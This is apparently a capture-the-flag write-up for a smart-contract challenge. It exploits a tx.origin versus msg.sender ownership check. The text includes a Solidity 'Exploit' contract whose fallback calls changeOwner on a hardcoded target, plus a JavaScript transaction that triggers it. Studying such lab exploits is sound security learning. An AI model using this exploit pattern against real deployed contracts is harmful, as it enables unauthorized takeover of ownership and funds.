
In the changeOwner() function the target is checking whether `tx.origin != msg.sender`. We can make this true if we deploy our own smart contract (which will be `msg.sender`), and then we call our smart contract from our MetaMask wallet with JavaScript, which becomes `tx.origin`. We will pass the address of our own wallet so we become the owner.

We write our own smart contract:
```solidity
pragma solidity ^0.4.18;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Exploit {
    constructor() public payable {}
    
    // Fallback
    function() public payable {
        address player = 0x8E0Ff062059376013FA56470805bec01b5aD06cc;
        address target_contract = 0x30d8FDc2cB50Db734e3eCC9c7A10f3BAa926aF95;
        Telephone(target_contract).changeOwner(player);
    }
}
```

And then use the JavaScript console in the browser to send a transcation to our deployed contract. This will trigger the fallback function which will then call the required function on the target, passing our own wallet address as the argument which will be made the owner.

```javascript
await sendTransaction({
  from: player,
  to: "0xB29CDdf2b7521Bf830884e8DA6D9D8c32c470fE8"
})
```
